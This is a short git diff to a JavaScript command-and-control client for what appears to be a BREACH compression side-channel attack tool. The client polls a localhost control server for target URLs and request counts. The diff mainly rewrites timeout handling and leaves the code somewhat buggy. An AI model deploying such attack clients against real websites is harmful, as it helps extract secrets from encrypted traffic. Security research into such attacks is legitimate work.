@@ -1,10 +1,11 @@
+
 const io = require('socket.io-client'),
       req = require('./request.js');
 
 var BREACHClient = {
     COMMAND_CONTROL_URL: 'http://localhost:3031/',
-    ONE_REQUEST_TIMEOUT: 5000,
-    MORE_WORK_TIMEOUT: 10000,
+    //ONE_REQUEST_TIMEOUT: 5000,
+    //MORE_WORK_TIMEOUT: 10000,
     _socket: null,
     init() {
         this._socket = io.connect(this.COMMAND_CONTROL_URL);
@@ -19,15 +20,18 @@ var BREACHClient = {
         console.log('Initialized');
     },
     noWork() {
+	var myself = this;
         console.log('No work');
-        setTimeout(this.getWork, MORE_WORK_TIMEOUT);
+	//setTimeout(() => { this....) 
+        setTimeout(function() {myself._socket.removeListener('connect'); },req.Collection.ONE_REQUEST_DEFAULT_TIMEOUT);
+	console.log('connetion abort')
     },
     doWork(work) {
         var {url, amount} = work;
 
         // TODO: rate limiting
         if (typeof url == 'undefined') {
-            noWork();
+            this.noWork();
             return;
         }
         console.log('Got work: ', work);
@@ -56,8 +60,9 @@ var BREACHClient = {
     },
     getWork() {
         console.log('Getting work');
-        this._socket.emit('get-work');
+        this._socket.emit('get-work');	
     }
 };
+
 
 BREACHClient.init();
